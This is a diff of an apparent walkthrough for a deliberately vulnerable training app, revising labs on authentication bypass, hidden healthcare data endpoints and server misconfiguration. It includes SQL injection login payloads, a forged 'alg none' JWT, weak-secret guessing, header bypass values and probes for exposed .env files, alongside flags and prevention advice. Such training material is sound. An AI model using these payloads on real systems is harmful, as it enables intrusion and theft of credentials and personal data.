@@ -94,33 +94,49 @@ This bypasses authentication and logs in as the admin user.
 
 ---
 
-## Lab 3: Authentication Bypass - Admin Panel
+## Lab 3: Authentication Bypass - JWT Manipulation
 
 **URL:** `/labs/beginner/auth-bypass`
-**API Endpoint:** `POST /api/labs/auth/login`
-**Scenario:** Administrative control panel with weak authentication
+**API Endpoints:**
+- `POST /api/labs/auth/login` - Get JWT token
+- `GET /api/labs/auth/admin` - Access admin panel (requires Bearer token)
+
+**Scenario:** Admin panel using JWT authentication with weak implementation
 
 ### Exploitation Steps
 
-1. Navigate to the admin login panel
-2. Intercept the login request with Burp Suite
-3. Use SQL injection to bypass authentication
+1. Login with valid credentials: `user:user123` or `guest:guest`
+2. You'll receive a JWT token in the response
+3. Decode the token (base64) to see the payload
+4. Modify the token to gain admin access
 
-**Payloads:**
+### JWT Token Structure
 ```
-admin'-- (in username field)
-' OR '1'='1 (in password field)
-' OR 1=1--
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: {"userId":100,"username":"user","role":"user","isAdmin":false,...}
+Signature: [base64 signature]
 ```
+
+### Attack 1: Algorithm None Bypass
+1. Decode the JWT header and payload
+2. Change header to: `{"alg":"none","typ":"JWT"}`
+3. Change payload role to: `"role":"admin","isAdmin":true`
+4. Remove the signature (keep the trailing dot)
+5. Send: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.`
+
+### Attack 2: Role Tampering with Weak Secret
+1. The JWT uses a weak secret that can be brute-forced
+2. Common secrets: `secret`, `password`, `123456`, `admin`
+3. Re-sign the modified token with the guessed secret
 
 ### Flags
-- `FLAG{AUTH_BYPASS_SQL_INJECTION}` - Basic bypass
-- `FLAG{ADMIN_ACCESS_GAINED}` - Full admin access
+- `FLAG{JWT_ALGORITHM_NONE_BYPASS}` - Algorithm confusion attack
+- `FLAG{JWT_ROLE_TAMPERING_SUCCESS}` - Role modification with valid signature
 
 ### Prevention
-- Use parameterized queries
-- Implement multi-factor authentication
-- Add account lockout policies
+- Never accept "none" algorithm
+- Use strong, random secrets
+- Implement proper role validation server-side
 
 ---
 
@@ -175,35 +191,53 @@ for payload in payloads:
 
 **URL:** `/labs/beginner/sensitive-data`
 **API Endpoints:**
-- `GET /api/labs/sensitive/patients` - List patients
-- `GET /api/labs/sensitive/patients/:id` - Get patient details
+- `GET /api/labs/sensitive/appointments` - List appointments (basic info)
+- `GET /api/labs/sensitive/patient/:id` - Get patient basic info
+- `GET /api/labs/sensitive/export?format=full` - **HIDDEN** - Export all sensitive data
+- `GET /api/labs/sensitive/backup` - **HIDDEN** - Backup configuration with AWS credentials
+- `GET /api/labs/sensitive/debug?key=healthcare_debug_2024` - **HIDDEN** - Debug endpoint
+
+**Scenario:** Healthcare portal with hidden endpoints exposing sensitive patient data
 
 ### Exploitation Steps
 
-1. Navigate to the healthcare portal
-2. View the list of patients (basic info only)
-3. Access individual patient profiles via API
-4. Observe that sensitive data (SSN, medical history) is exposed
+1. Navigate to the healthcare portal - you only see appointments
+2. The visible API only shows basic patient info
+3. Use Burp Suite to discover hidden endpoints:
+   - Try common API paths: `/export`, `/backup`, `/debug`, `/admin`
+   - Check for parameter fuzzing: `?format=full`, `?format=csv`
 
-**Request:**
+### Hidden Endpoint Discovery
+
+**Export Endpoint:**
 ```
-GET /api/labs/sensitive/patients/1
+GET /api/labs/sensitive/export?format=full
 ```
+Returns: All patient data including SSN, medical history, insurance
 
-**Response includes:**
-- Social Security Number
-- Full medical history
-- Insurance policy details
-- Blood type, allergies, conditions
+**Backup Endpoint:**
+```
+GET /api/labs/sensitive/backup
+```
+Returns: AWS credentials and backup configuration
 
-### Flag
-- `FLAG{SENSITIVE_DATA_EXPOSED}` - Accessing any patient's full profile
+**Debug Endpoint:**
+```
+GET /api/labs/sensitive/debug?key=healthcare_debug_2024
+```
+Returns: Database credentials and API keys
+
+### Flags
+- `FLAG{SENSITIVE_DATA_EXPORT_EXPOSED}` - Single patient export
+- `FLAG{BULK_SENSITIVE_DATA_LEAK}` - All patients bulk export
+- `FLAG{BACKUP_CREDENTIALS_EXPOSED}` - AWS backup credentials
+- `FLAG{DEBUG_ENDPOINT_DISCOVERED}` - Debug endpoint with secrets
 
 ### Prevention
-- Implement proper access control
-- Use data masking for sensitive fields
-- Apply field-level encryption
-- Audit access to PII/PHI
+- Remove or protect debug/export endpoints
+- Implement proper authentication for all endpoints
+- Use API gateway with route protection
+- Regular security audits for hidden endpoints
 
 ---
 
@@ -291,37 +325,66 @@ GET /api/labs/access/users/3   (HR Director)
 ## Lab 8: Security Misconfiguration - EcoShop
 
 **URL:** `/labs/beginner/misconfig`
-**API Endpoint:** `GET /api/labs/misconfig/search?q=`
-**Scenario:** E-commerce site with verbose error messages
+**API Endpoints:**
+- `GET /api/labs/misconfig/search?q=` - Product search (verbose errors)
+- `GET /api/labs/misconfig/.env` - **HIDDEN** - Environment file
+- `GET /api/labs/misconfig/config.json` - **HIDDEN** - Configuration file
+- `GET /api/labs/misconfig/admin` - Admin panel with header bypass
+- `GET /api/labs/misconfig/server-status` - Server information disclosure
 
-### Exploitation Steps
+**Scenario:** E-commerce site with multiple security misconfigurations
 
-1. Navigate to the product search
-2. Enter special characters to trigger errors
-3. Observe exposed database credentials in error response
+### Attack 1: Verbose Error Messages
 
 **Payload:**
 ```
-/api/labs/misconfig/search?q='
-/api/labs/misconfig/search?q="
-/api/labs/misconfig/search?q=\
+GET /api/labs/misconfig/search?q='
+```
+Triggers database error with credentials in response.
+
+### Attack 2: Exposed Configuration Files
+
+```
+GET /api/labs/misconfig/.env
+GET /api/labs/misconfig/config.json
+```
+Returns full environment variables including:
+- Database credentials
+- AWS access keys
+- Stripe API keys
+- JWT secrets
+
+### Attack 3: Debug Header Bypass
+
+```
+GET /api/labs/misconfig/admin
+Headers: X-Debug-Mode: true
+```
+OR
+```
+Headers: X-Admin-Token: ecoshop_admin_2024
 ```
 
-**Response exposes:**
-- Database connection string with credentials
-- PostgreSQL server version
-- API keys
-- Internal file paths
-- Stack traces
+### Attack 4: Server Information Disclosure
 
-### Flag
-- `FLAG{VERBOSE_ERROR_EXPOSURE}` - Triggering error disclosure
+```
+GET /api/labs/misconfig/server-status
+```
+Exposes internal IP, server versions, and system information.
+
+### Flags
+- `FLAG{VERBOSE_ERROR_EXPOSURE}` - Error-based credential leak
+- `FLAG{ENV_FILE_EXPOSED}` - .env file accessible
+- `FLAG{CONFIG_FILE_EXPOSED}` - config.json accessible
+- `FLAG{DEBUG_HEADER_ADMIN_BYPASS}` - X-Debug-Mode bypass
+- `FLAG{WEAK_ADMIN_TOKEN}` - Weak admin token
+- `FLAG{SERVER_INFO_DISCLOSURE}` - Server status exposure
 
 ### Prevention
-- Disable verbose error messages in production
-- Use generic error pages
-- Log detailed errors server-side only
-- Never expose credentials in responses
+- Disable verbose errors in production
+- Block access to configuration files
+- Remove debug endpoints/headers
+- Use proper authentication for admin routes
 
 ---
 
